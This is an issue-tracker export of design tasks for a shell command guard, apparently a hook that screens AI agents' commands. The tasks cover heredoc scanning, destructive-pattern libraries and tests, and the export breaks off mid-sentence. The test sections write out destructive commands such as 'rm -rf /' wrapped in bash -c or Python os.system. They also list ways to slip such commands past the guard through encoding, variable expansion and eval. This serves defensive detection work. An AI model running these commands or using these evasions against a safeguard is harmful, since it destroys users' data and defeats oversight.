{"id":"git_safety_guard-26f","title":"Define TypeScript destructive patterns for heredoc scanning","description":"## Objective\n\nDefine ast-grep/tree-sitter patterns to detect dangerous TypeScript constructs within heredoc bodies.\n\n## Why This Matters\n\nTypeScript heredocs (ts-node, tsx, npx ts-node) share JavaScript's risks plus:\n1. Type erasure can hide dangerous operations behind clean interfaces\n2. Decorators and metaprogramming can obscure behavior\n3. Many TypeScript users assume type safety means runtime safety (it doesn't)\n\n## Pattern Categories to Define\n\n### All JavaScript Patterns (Inherited)\nAll patterns from the JavaScript task apply here since TypeScript compiles to JavaScript.\n\n### TypeScript-Specific Patterns\n- any type casts that hide dangerous operations\n- Type assertions (as unknown as DangerousType)\n- @ts-ignore comments preceding dangerous code\n- Non-null assertions (!) on potentially null file handles\n\n### Decorator Abuse\n- Decorators that execute arbitrary code\n- Metadata reflection for dynamic execution\n- Class decorator patterns that modify behavior\n\n### Module System\n- Triple-slash directives loading external code\n- Type-only imports that get erased (import type)\n- Namespace merging that hides implementations\n\n## Implementation Notes\n\nTypeScript parsing requires tree-sitter-typescript which handles:\n- Generic type syntax\n- Type annotations\n- Decorators\n- JSX/TSX syntax variants\n\nConsider whether to parse TypeScript directly or check the JavaScript output.\n\n## Test Cases\n\nTest TypeScript-specific constructs:\n- Type assertions around dangerous calls\n- Decorator execution order\n- Generic type inference edge cases\n- Module augmentation\n\n## Dependencies\n\n- JavaScript patterns (shared base)\n- Pattern library structure design\n- ast-grep invocation layer\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:37:17.541114003-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:37:26.449207203-05:00","dependencies":[{"issue_id":"git_safety_guard-26f","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:37:34.25492655-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-26f","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:37:34.273731104-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-26f","depends_on_id":"git_safety_guard-mcf","type":"blocks","created_at":"2026-01-07T18:37:34.292923988-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-2cu","title":"Design false positive reduction strategy for string arguments","description":"## Objective\n\nDesign and implement strategies to dramatically reduce false positives in command blocking, especially for documentation and string arguments.\n\n## The Core Problem\n\nThe current regex-based guard suffers from context blindness. It sees:\n```\nbd create --description=\"Pattern blocks rm -rf commands\"\n```\n\nAnd matches \"rm -rf\" without understanding it's:\n1. Inside a quoted string\n2. An argument to a documentation tool\n3. NOT actually being executed\n\nThis creates severe workflow disruption when trying to document the very patterns we're blocking.\n\n## Why This Is Critical\n\nFalse positives are arguably WORSE than false negatives:\n- False negative: A dangerous command might slip through (rare, recoverable with backups)\n- False positive: Blocks legitimate work, forces workarounds, erodes trust in the tool\n- Repeated false positives lead users to disable the guard entirely\n\nThe guard must be TRUSTED to make intelligent decisions, not blindly pattern-match text.\n\n## Solution Approaches\n\n### 1. Command Structure Analysis (Primary Approach)\n\nParse the top-level command with tree-sitter-bash to understand structure:\n- Identify command name (bd, git, echo, etc.)\n- Identify argument positions (which are options vs values)\n- Identify quoting context (single, double, unquoted)\n- Only apply destructive patterns to EXECUTABLE positions\n\nExample analysis:\n```\nbd create --title=\"...\" --description=\"rm -rf pattern docs\"\n         ^command       ^option         ^string value (NOT executed)\n```\n\n### 2. Safe Command Registry\n\nMaintain a list of commands that take non-executable string arguments:\n- bd create, bd update (--description, --title)\n- git commit (-m), git tag (-m)\n- echo, printf (arguments are printed, not executed)\n- grep, rg (pattern arguments)\n\nFor these commands, don't apply destructive patterns to their string arguments.\n\n### 3. Execution Context Detection\n\nDistinguish between:\n- **Direct execution**: The string IS the command (`bash dangerous_cmd`)\n- **String literal**: The string is DATA passed to a command (`bd --desc=\"...\"`)\n- **Heredoc body**: Requires language-specific analysis (the whole point of ast-grep)\n\n### 4. Two-Phase Analysis\n\n1. **Quick structural check**: Parse command structure, identify context\n2. **Pattern matching**: Only apply patterns to executable contexts\n3. **Deep analysis**: For heredocs/complex cases, use ast-grep\n\n### 5. Confidence Scoring\n\nInstead of binary block/allow:\n- High confidence dangerous: Block immediately\n- Medium confidence: More thorough analysis\n- Low confidence (looks like documentation): Allow with optional warning\n\n## Implementation Strategy\n\n1. Add tree-sitter-bash as a dependency (if not using ast-grep CLI)\n2. Parse incoming commands to identify structure\n3. Create ExecutionContext enum: Direct, StringArg, Heredoc, PipeTarget\n4. Only apply destructive patterns when context is Direct, Heredoc, or PipeTarget\n5. For StringArg context with safe parent commands, skip pattern matching\n\n## Test Cases\n\nEssential false positive tests:\n- `bd create --description=\"This blocks rm -rf\"` → ALLOW\n- `git commit -m \"Fix rm -rf pattern matching\"` → ALLOW\n- `echo \"example: git reset --hard\"` → ALLOW\n- `grep \"rm -rf\" patterns.txt` → ALLOW\n\nEssential true positive tests (should still block):\n- `rm -rf /tmp/*` → BLOCK\n- `bash -c \"rm -rf /\"` → BLOCK\n- `python3 \u003c\u003c 'EOF'\n  import os; os.system(\"rm -rf /\")\n  EOF` → BLOCK (via heredoc analysis)\n\n## Success Criteria\n\n- Zero false positives for documentation workflows (bd, git commit -m)\n- Zero false positives for string pattern searches (grep, rg)\n- Maintain blocking of actual dangerous commands\n- Sub-5ms overhead for structural analysis\n\n## Dependencies\n\n- Heredoc detection strategy (shares parsing infrastructure)\n- May influence choice of ast-grep vs tree-sitter-rust\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:36:56.104462373-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:37:02.97601574-05:00","dependencies":[{"issue_id":"git_safety_guard-2cu","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:37:02.996636534-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-2cu","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:37:03.01736459-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-2d4","title":"Define Perl destructive patterns for heredoc scanning","description":"## Objective\n\nDefine ast-grep/tree-sitter patterns to detect dangerous Perl constructs within heredoc bodies.\n\n## Why This Matters\n\nPerl heredocs are a classic attack vector because:\n1. Perl is often used for system administration scripts\n2. system(), exec(), backticks are core features\n3. Perl's \"TIMTOWTDI\" philosophy means many ways to do dangerous things\n4. Perl heredocs have complex quoting semantics\n\n## Pattern Categories to Define\n\n### Shell Execution\n- system() and exec() calls\n- Backtick commands `cmd`\n- qx// operator (equivalent to backticks)\n- open() with pipe syntax (open FH, \"|cmd\" or \"cmd|\")\n- IPC::Open2, IPC::Open3\n\n### Filesystem Operations\n- unlink() for file deletion\n- rmdir() for directory removal\n- File::Path::rmtree\n- rename() and link() for file manipulation\n\n### Dangerous Built-ins\n- eval() for code execution\n- do EXPR for executing files\n- require/use with dynamic paths\n- AUTOLOAD abuse\n\n### Regular Expression Dangers\n- /e modifier (eval in regex replacement)\n- Regex denial of service patterns\n- (?{code}) embedded code in regex\n\n### Process Control\n- kill() on processes\n- fork() and wait()\n- alarm() and signal handlers\n\n### Data Handling\n- Two-argument open() (security risk)\n- Reading from tainted input\n- LWP/HTTP::Tiny for network access\n\n## Implementation Notes\n\nPerl is notoriously hard to parse correctly. Challenges include:\n- Context-dependent syntax\n- Sigils ($, @, %, *)\n- Barewords vs strings vs subroutines\n- Regular expression complexity\n- Here-doc quoting variations\n\ntree-sitter-perl exists but may have limitations for complex Perl.\n\n## Test Cases\n\nPerl-specific tests:\n- Various quoting mechanisms\n- Regex with embedded code\n- open() variants\n- Sigil interpolation\n\n## Dependencies\n\n- Pattern library structure design\n- ast-grep invocation layer\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:37:19.324205765-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:37:26.492349961-05:00","dependencies":[{"issue_id":"git_safety_guard-2d4","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:37:37.366046506-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-2d4","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:37:37.385299864-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-2j3","title":"Research tree-sitter Rust bindings","description":"# Research tree-sitter Rust Bindings\n\n## Objective\nEvaluate direct tree-sitter integration as an alternative to ast-grep CLI.\n\n## Background\ntree-sitter is the underlying parsing library used by ast-grep. Using it directly could offer:\n- Lower latency (no process spawning)\n- More control over parsing\n- Smaller dependency footprint (maybe)\n\nHowever, it may require more work to implement pattern matching.\n\n## Research Areas\n\n### 1. tree-sitter Rust Crate\n- API documentation and examples\n- How to load language grammars\n- Parsing API (parse string, get AST)\n- Query API for pattern matching\n\n### 2. Language Grammar Crates\n- tree-sitter-python\n- tree-sitter-bash\n- tree-sitter-javascript\n- tree-sitter-typescript\n- tree-sitter-ruby\n- How are grammars distributed? (separate crates vs bundled)\n\n### 3. Query Language\n- S-expression query syntax\n- Captures and predicates\n- Multiple patterns in one query\n- Performance of compiled queries\n\n### 4. Build Complexity\n- Compile time impact\n- Binary size impact\n- Cross-compilation considerations\n- Grammar file generation (if needed)\n\n### 5. Comparison with ast-grep\n- Feature parity\n- Development effort\n- Maintenance burden\n- Community support\n\n## Deliverables\n- Document comparing tree-sitter direct vs ast-grep\n- Code examples for both approaches\n- Recommendation with justification\n\n## Success Criteria\n- Clear understanding of trade-offs\n- Can make informed architecture decision\n- Have working proof-of-concept for both approaches","notes":"Research completed: tree-sitter v0.26.3 available with 11M+ downloads. Language grammars: tree-sitter-bash, tree-sitter-python, tree-sitter-javascript all at ^0.23.0. Ruby available, Perl uncertain.","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:28:46.751144719-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:46:14.52717456-05:00"}
{"id":"git_safety_guard-2ta","title":"Implement two-tier detection architecture (regex + ast-grep)","description":"# Two-Tier Architecture for Heredoc Detection\n\n## Key Insight\n\nThe architecture uses a **two-tier approach** to balance performance with accuracy:\n\n1. **Tier 1**: Use fast regex for heredoc detection (the regex crate uses Aho-Corasick for static compound patterns and SIMD - extremely optimized)\n2. **Tier 2**: Once a heredoc is detected, use AST-aware parsing (ast-grep) rather than reimplementing structural analysis badly with regex\n\nThis ensures 99%+ of commands (which don't contain heredocs) pay only microseconds of overhead, while heredoc commands get proper structural analysis.\n\n## Performance Budget\n\n| Operation | Budget | Typical |\n|-----------|--------|--------|\n| Tier 1 regex check | \u003c100μs | 1-10μs |\n| Heredoc extraction | \u003c1ms | 100-500μs |\n| AST parsing | \u003c5ms | 500μs-2ms |\n| **Total (heredoc path)** | \u003c10ms | 1-5ms |\n\n## Dependencies\n\nregex = \"1.10\" for Tier 1\nast-grep-core = \"0.40\" for Tier 2","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T19:30:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T19:30:00-05:00","dependencies":[{"issue_id":"git_safety_guard-2ta","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:56:44.30180478-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-2ta","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:56:44.343696983-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-49s","title":"Implement heredoc syntax detection (regex quick-check)","description":"# Implement Heredoc Syntax Detection (Regex Quick-Check)\n\n## Objective\nImplement a fast regex-based detector that identifies commands potentially containing heredoc content.\n\n## Background\nBefore we can scan heredoc content, we need to detect its presence. This is a two-stage approach:\n1. Quick regex check (this task) - fast, may have false positives\n2. Full extraction (separate task) - accurate, only runs if quick check triggers\n\n## Implementation Details\n\n### Quick-Check Patterns\nThe quick check should match common heredoc indicators:\n\n```rust\n// Patterns to detect heredoc presence\nstatic HEREDOC_QUICK_PATTERNS: \u0026[\u0026str] = \u0026[\n    r\"\u003c\u003c[-~]?\\s*['\\\"]?\\w+['\\\"]?\",  // \u003c\u003c EOF, \u003c\u003c- 'EOF', \u003c\u003c~ \"END\"\n    r\"\u003c\u003c\u003c\\s*['\\\"]\",                 // \u003c\u003c\u003c \"here string\"\n    r\"-c\\s+['\\\"]\",                  // python -c \"code\", bash -c 'code'\n    r\"-e\\s+['\\\"]\",                  // node -e \"code\", perl -e 'code'\n];\n```\n\n### Integration Point\nAdd to the main processing pipeline after quick-reject but before pattern matching:\n\n```rust\nfn process_command(cmd: \u0026str) -\u003e Decision {\n    // Existing quick-reject (no git/rm)\n    if quick_reject(cmd) \u0026\u0026 global_quick_reject(cmd) {\n        return Decision::Allow;\n    }\n    \n    // NEW: Check for potential heredoc content\n    if has_potential_heredoc(cmd) {\n        if let Some(reason) = scan_heredoc_content(cmd) {\n            return Decision::Deny(reason);\n        }\n    }\n    \n    // Continue with existing pattern matching...\n}\n```\n\n### Performance Requirements\n- Quick check must complete in \u003c 0.5ms\n- Should not allocate on the hot path\n- Use lazy-compiled static patterns\n\n### False Positive Tolerance\n- Quick check can have false positives (triggers full scan unnecessarily)\n- Quick check must NOT have false negatives (miss actual heredocs)\n- Full scan will handle false positives gracefully\n\n## Files to Modify\n- src/packs/mod.rs or new src/heredoc/mod.rs\n- src/main.rs (pipeline integration)\n\n## Testing\n- Test each heredoc variant is detected\n- Test non-heredoc commands don't trigger\n- Benchmark quick check performance\n\n## Dependencies\n- Design: heredoc detection strategy (git_safety_guard-o15)\n- ADR approved (git_safety_guard-5ib)\n\n## Success Criteria\n- All heredoc variants from design doc are detected\n- Quick check adds \u003c 0.5ms to non-heredoc commands\n- Zero false negatives in test suite","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:30:59.514233315-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:30:59.514233315-05:00","dependencies":[{"issue_id":"git_safety_guard-49s","depends_on_id":"git_safety_guard-5ib","type":"blocks","created_at":"2026-01-07T18:31:05.994685018-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-49s","depends_on_id":"git_safety_guard-2ta","type":"blocks","created_at":"2026-01-07T18:56:44.362201361-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-49s","depends_on_id":"git_safety_guard-t1rx","type":"blocks","created_at":"2026-01-07T19:28:32.390746435-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-4o8","title":"Create documentation for heredoc detection feature","description":"## Objective\n\nCreate comprehensive documentation for the heredoc detection feature, covering user configuration, pattern authoring, and security considerations.\n\n## Documentation Deliverables\n\n### 1. User Guide Updates\n\n#### README.md Updates\n- Add heredoc scanning to feature list\n- Document new command-line options (if any)\n- Update configuration examples\n\n#### Configuration Guide\n- How to enable/disable heredoc scanning\n- Language-specific configuration\n- Performance tuning options\n- Fallback behavior settings\n\n### 2. Pattern Authoring Guide\n\nNew document: `docs/patterns.md`\n\n#### Pattern Syntax\n- tree-sitter query syntax (if using queries)\n- ast-grep pattern syntax (if using ast-grep-core)\n- Examples for each supported language\n\n#### Adding New Patterns\n- Step-by-step guide\n- Testing requirements\n- Performance considerations\n- Review checklist\n\n#### Pattern Library Reference\n- Complete list of all patterns\n- What each pattern detects\n- Known limitations\n- False positive/negative notes\n\n### 3. Security Documentation\n\nNew document: `docs/security.md`\n\n#### Threat Model\n- Attack vectors heredoc detection addresses\n- Attack vectors explicitly out of scope\n- Assumptions and limitations\n\n#### Bypass Considerations\n- Known potential bypasses\n- Why certain bypasses are accepted\n- Defense in depth recommendations\n\n#### Incident Response\n- What to do if a command is wrongly blocked\n- What to do if a dangerous command gets through\n- How to report security issues\n\n### 4. Developer Documentation\n\n#### Architecture Overview\n- Pipeline flow diagram\n- Module responsibilities\n- Data flow through heredoc analysis\n\n#### API Documentation\n- Internal Rust API documentation (rustdoc)\n- Integration points for extending\n- Error handling patterns\n\n#### Contributing Guide Updates\n- How to add new language support\n- How to add new patterns\n- Testing requirements for contributions\n\n### 5. AGENTS.md Updates\n\nUpdate the AI agent guidelines:\n- New heredoc detection capabilities\n- How to test heredoc patterns\n- False positive handling guidance\n\n## Documentation Quality Requirements\n\n- All code examples must be tested\n- All configuration examples must be valid\n- Mermaid diagrams for complex flows\n- Cross-references between related docs\n- Version numbers where relevant\n\n## Dependencies\n\n- Feature implementation complete\n- Test suite passing\n- Performance benchmarks available\n- ADR finalized\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:40:41.014282391-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:40:53.349791375-05:00","dependencies":[{"issue_id":"git_safety_guard-4o8","depends_on_id":"git_safety_guard-8wt","type":"blocks","created_at":"2026-01-07T18:40:53.36819319-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-5ib","title":"Write architecture decision document (ADR)","description":"# Write Architecture Decision Document (ADR)\n\n## Objective\nSynthesize research findings into a formal Architecture Decision Record that guides implementation.\n\n## Background\nAfter completing research on ast-grep, tree-sitter, and design tasks, we need to document the chosen approach and rationale. This ADR will be the reference for all implementation work.\n\n## ADR Structure\n\n### 1. Title\n\"ADR-001: Heredoc Scanning Architecture\"\n\n### 2. Status\nProposed -\u003e Accepted -\u003e Implemented\n\n### 3. Context\n- Problem statement (heredoc bypass attacks)\n- Constraints (performance, dependencies, maintenance)\n- Options considered\n\n### 4. Decision\n- Chosen approach (ast-grep CLI vs library vs tree-sitter direct)\n- Pattern storage format\n- Integration points with existing dcg architecture\n\n### 5. Consequences\n- Benefits of chosen approach\n- Drawbacks and mitigations\n- Future considerations\n\n### 6. Technical Details\n- Dependency changes to Cargo.toml\n- New modules and their responsibilities\n- Data flow through the system\n- Configuration schema additions\n\n## Key Decisions to Document\n\n### Integration Approach\n- CLI invocation vs library\n- Sync vs async processing\n- Caching strategy\n\n### Language Support\n- Initial language set\n- Grammar distribution\n- Extension mechanism\n\n### Pattern Format\n- Hardcoded vs external\n- File format (YAML, TOML, custom)\n- Validation approach\n\n### Performance Strategy\n- Quick-reject optimizations\n- Lazy loading\n- Timeout handling\n\n### Error Handling\n- Parse failures\n- Unknown languages\n- Pattern match errors\n\n## Deliverables\n- ADR document in docs/adr/001-heredoc-scanning.md\n- Updated AGENTS.md with implementation notes\n- Diagram showing data flow\n\n## Dependencies\n- Research: ast-grep API (git_safety_guard-b45)\n- Research: tree-sitter bindings (git_safety_guard-2j3)\n- Design: heredoc detection (git_safety_guard-o15)\n- Design: language detection (git_safety_guard-jfj)\n- Design: pattern library (git_safety_guard-6sg)\n\n## Success Criteria\n- Clear, actionable decisions documented\n- All stakeholder concerns addressed\n- Implementation can proceed without ambiguity","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:30:31.162229073-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:30:31.162229073-05:00","dependencies":[{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:30:37.437715869-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:30:37.457081439-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-o15","type":"blocks","created_at":"2026-01-07T18:30:37.477144052-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-jfj","type":"blocks","created_at":"2026-01-07T18:30:37.496865872-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:30:37.516274063-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-boy","type":"blocks","created_at":"2026-01-07T18:39:09.196463586-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-6sg","title":"Design destructive pattern library structure","description":"# Design Destructive Pattern Library Structure\n\n## Objective\nDesign the structure and organization of language-specific destructive patterns for heredoc scanning.\n\n## Background\nEach supported language has its own idioms for destructive operations. We need a well-organized pattern library that:\n- Is maintainable and extensible\n- Integrates with the existing pack system\n- Provides clear documentation for each pattern\n\n## Pattern Categories by Language\n\n### Python Patterns\n- File system: os.remove, os.unlink, shutil.rmtree, pathlib.Path.unlink\n- Process execution: os.system, subprocess.run/call/Popen\n- Database: DROP TABLE, TRUNCATE (via string in execute())\n\n### Bash Patterns\n- File deletion: rm, unlink, shred\n- Git operations: git reset, git clean, git checkout (destructive forms)\n- System: reboot, shutdown, init\n\n### JavaScript/Node Patterns\n- File system: fs.rmSync, fs.unlinkSync, fs.rmdirSync\n- Process: child_process.exec, child_process.spawn\n- Database operations in strings\n\n### Ruby Patterns\n- FileUtils.rm_rf, File.delete, Dir.rmdir\n- system(), exec(), backticks\n- Database operations\n\n### Perl Patterns\n- unlink, rmdir, rmtree\n- system(), exec(), backticks\n- Database operations\n\n## Design Considerations\n\n### 1. Pattern Specification Format\nShould patterns be:\n- Hardcoded in Rust?\n- Loaded from YAML/TOML files?\n- ast-grep rule files?\n\nTrade-offs:\n- Hardcoded: Fast, type-safe, harder to update\n- External files: Flexible, slower to load, easier to contribute\n- Hybrid: Core patterns hardcoded, extensions in files\n\n### 2. Pattern Metadata\nEach pattern needs:\n- Unique ID\n- Language\n- ast-grep/tree-sitter pattern\n- Human-readable description\n- Severity level\n- False positive likelihood\n- Suggested alternative\n\n### 3. Pack Integration\nHow do heredoc patterns integrate with existing packs?\n- New pack category: heredoc.*?\n- Sub-patterns within existing packs?\n- Separate configuration section?\n\n### 4. Contextual Patterns\nSome patterns are only dangerous in context:\n- subprocess.run is fine for \"ls\", dangerous for \"rm\"\n- Need to check arguments, not just function calls\n- May require more complex pattern matching\n\n### 5. Allowlisting\nUsers need to allowlist legitimate uses:\n- Test files that exercise dangerous code paths\n- Documentation containing examples\n- CI scripts that intentionally clean up\n\n## Deliverables\n- Pattern specification format (schema)\n- Initial pattern inventory per language\n- Integration plan with pack system\n- Allowlist/exception mechanism design\n\n## Success Criteria\n- Clear, consistent pattern format\n- Coverage of top 10 dangerous patterns per language\n- Smooth integration with existing dcg architecture\n- Path for community contributions","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:30:05.921495349-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:30:05.921495349-05:00","dependencies":[{"issue_id":"git_safety_guard-6sg","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:30:14.503126907-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-6sg","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:30:14.524054168-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-7f5","title":"Implement two-tier detection architecture (regex + ast-grep)","description":"# Two-Tier Architecture for Heredoc Detection\n\n## Key Insight\n\nThe architecture uses a **two-tier approach** to balance performance with accuracy:\n\n1. **Tier 1**: Use fast regex for heredoc detection (the `regex` crate uses Aho-Corasick for static compound patterns and SIMD - it's extremely optimized)\n2. **Tier 2**: Once a heredoc is detected, use AST-aware parsing (ast-grep) rather than reimplementing structural analysis badly with regex\n\nThis ensures 99%+ of commands (which don't contain heredocs) pay only microseconds of overhead, while heredoc commands get proper structural analysis.\n\n## Architecture\n\n```\nCommand Input\n     │\n     ▼\n┌─────────────────────────────────────────────┐\n│  TIER 1: Fast Regex Detection (μs)          │\n│  ─────────────────────────────────────────  │\n│  • regex crate (Aho-Corasick + SIMD)        │\n│  • Static pattern set for heredoc markers   │\n│  • Quick reject: 99%+ commands pass through │\n│  • Cost: ~1-10 microseconds                 │\n└─────────────────────────────────────────────┘\n     │\n     │ heredoc detected?\n     │\n     ├──── NO ───▶ Continue to existing pattern matching\n     │\n     ▼ YES\n┌─────────────────────────────────────────────┐\n│  TIER 2: AST-Aware Analysis (ms)            │\n│  ─────────────────────────────────────────  │\n│  • ast-grep-core for structural parsing     │\n│  • Language-specific pattern matching       │\n│  • Only invoked when heredocs found         │\n│  • Cost: ~1-5 milliseconds                  │\n└─────────────────────────────────────────────┘\n     │\n     ▼\n  Block/Allow Decision\n```\n\n## Tier 1: Regex-Based Heredoc Detection\n\n### Why `regex` crate?\n\nThe Rust `regex` crate is extraordinarily optimized:\n- **Aho-Corasick**: Multi-pattern matching in O(n) time\n- **SIMD**: Vectorized string operations (AVX2, SSE4.2)\n- **Lazy DFA**: JIT-compiled automata\n- **No backtracking**: Guaranteed linear time\n\n### Heredoc Markers to Detect\n\n```rust\nuse regex::RegexSet;\n\nstatic HEREDOC_PATTERNS: LazyLock\u003cRegexSet\u003e = LazyLock::new(|| {\n    RegexSet::new([\n        // Bash heredocs\n        r\"\u003c\u003c-?\\s*['\\\"]?\\w+['\\\"]?\",      // \u003c\u003cEOF, \u003c\u003c'EOF', \u003c\u003c\"EOF\", \u003c\u003c-EOF\n        r\"\u003c\u003c\u003c\",                           // Here-string\n\n        // Inline script flags\n        r\"\\b(python3?|ruby|perl|node)\\s+-[ec]\\s\",\n        r\"\\bsh\\s+-c\\s\",\n        r\"\\bbash\\s+-c\\s\",\n\n        // Pipe to interpreter\n        r\"\\|\\s*(python3?|ruby|perl|node|sh|bash)\\b\",\n    ]).expect(\"heredoc patterns should compile\")\n});\n```\n\n### Quick Reject Logic\n\n```rust\nfn might_contain_heredoc(cmd: \u0026str) -\u003e bool {\n    HEREDOC_PATTERNS.is_match(cmd)\n}\n```\n\nCost: **~1-10 microseconds** for typical commands.\n\n## Tier 2: AST-Aware Analysis\n\nOnly invoked when Tier 1 detects a potential heredoc.\n\n### Why ast-grep?\n\n- **Structural matching**: Understands code structure, not just text\n- **Language-aware**: Different patterns for Python vs Bash vs JS\n- **Pattern syntax**: Intuitive `os.system($CMD)` instead of regex\n- **Battle-tested**: Used in production for large-scale code search\n\n### Example Flow\n\n```rust\nfn check_heredoc(cmd: \u0026str) -\u003e Option\u003cCheckResult\u003e {\n    // Tier 1: Quick regex check\n    if !might_contain_heredoc(cmd) {\n        return None;  // Fast path: no heredoc\n    }\n\n    // Tier 2: Extract and analyze heredoc content\n    let heredoc_info = extract_heredoc(cmd)?;\n    let language = detect_language(\u0026heredoc_info);\n\n    // Parse with ast-grep\n    let matches = match_destructive_patterns(\u0026heredoc_info.content, language);\n\n    if !matches.is_empty() {\n        return Some(CheckResult::blocked(\n            \u0026format!(\"Heredoc contains dangerous pattern: {}\", matches[0].reason),\n            \"heredoc\"\n        ));\n    }\n\n    None  // Heredoc is safe\n}\n```\n\n## Performance Budget\n\n| Operation | Budget | Typical |\n|-----------|--------|---------|\n| Tier 1 regex check | \u003c100μs | 1-10μs |\n| Heredoc extraction | \u003c1ms | 100-500μs |\n| Language detection | \u003c100μs | 10-50μs |\n| AST parsing | \u003c5ms | 500μs-2ms |\n| Pattern matching | \u003c1ms | 100-500μs |\n| **Total (heredoc path)** | \u003c10ms | 1-5ms |\n\n## Implementation Priority\n\n1. **First**: Implement Tier 1 with `regex` crate\n2. **Second**: Add heredoc extraction logic\n3. **Third**: Integrate ast-grep for Tier 2\n4. **Fourth**: Optimize based on benchmarks\n\n## Dependencies\n\n```toml\n# Tier 1: Fast regex\nregex = \"1.10\"  # Already highly optimized\n\n# Tier 2: AST analysis\nast-grep-core = \"0.40\"\nast-grep-language = { version = \"0.37\", features = [\"bash\", \"python\", \"javascript\"] }\n```\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:54:46.613326588-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:54:49.625047131-05:00"}
{"id":"git_safety_guard-8wt","title":"Create comprehensive test suite for heredoc detection","description":"## Objective\n\nCreate comprehensive test coverage for heredoc detection and AST-based pattern matching, including unit tests, integration tests, and bypass attempt tests.\n\n## Test Categories\n\n### 1. Unit Tests\n\n#### Heredoc Detection Tests\n- Bash heredoc variants: \u003c\u003cEOF, \u003c\u003c-EOF, \u003c\u003c\u003c, \u003c\u003c'EOF', \u003c\u003c\"EOF\"\n- Python multiline strings as heredocs: python3 -c '''...'''\n- Node.js: node -e '...', node \u003c\u003cEOF\n- Perl: perl -e '...', perl \u003c\u003c'END'\n- Ruby: ruby -e '...', ruby \u003c\u003c~RUBY\n\n#### Language Detection Tests\n- Detection from command prefix (python3, node, ruby, perl, bash)\n- Detection from shebang (#!/usr/bin/env python3)\n- Detection from content heuristics (import statements, require(), etc.)\n- Fallback behavior for unknown languages\n\n#### Pattern Matching Tests\n- Each destructive pattern per language\n- Each safe pattern (things that look dangerous but aren't)\n- Edge cases in quoting and escaping\n- Variable interpolation handling\n\n### 2. Integration Tests\n\n#### Pipeline Tests\n- Full flow from JSON input to block/allow decision\n- Heredoc commands correctly trigger deep analysis\n- Non-heredoc commands still use fast path\n- Performance within latency budget\n\n#### Error Handling Tests\n- Malformed heredoc syntax\n- Unparseable content (binary, corrupted)\n- Unknown languages fall back gracefully\n- Timeout handling\n\n### 3. Bypass Attempt Tests (Security Focus)\n\nThese are CRITICAL - they test the actual attack vectors we're trying to block.\n\n#### Encoding Bypasses\n- Base64 encoded commands in heredocs\n- Hex encoding\n- Unicode obfuscation\n- String concatenation to build dangerous strings\n\n#### Indirection Bypasses\n- Variable expansion: CMD=\"rm\"; ${CMD} -rf\n- Array expansion: arr=(rm -rf /); \"${arr[@]}\"\n- Command substitution: $(echo rm) -rf\n- Eval-based: eval \"dangerous command\"\n\n#### Language-Specific Bypasses\n- Python: __import__, exec(), compile()\n- JavaScript: eval(), Function(), require()\n- Ruby: send(), instance_eval(), Kernel.`\n- Perl: eval, do EXPR, qx//\n\n#### Heredoc Nesting\n- Heredoc containing another heredoc\n- Heredoc with escaped delimiters\n- Heredoc across multiple commands (pipelines)\n\n### 4. False Positive Tests\n\nEnsure we DON'T block 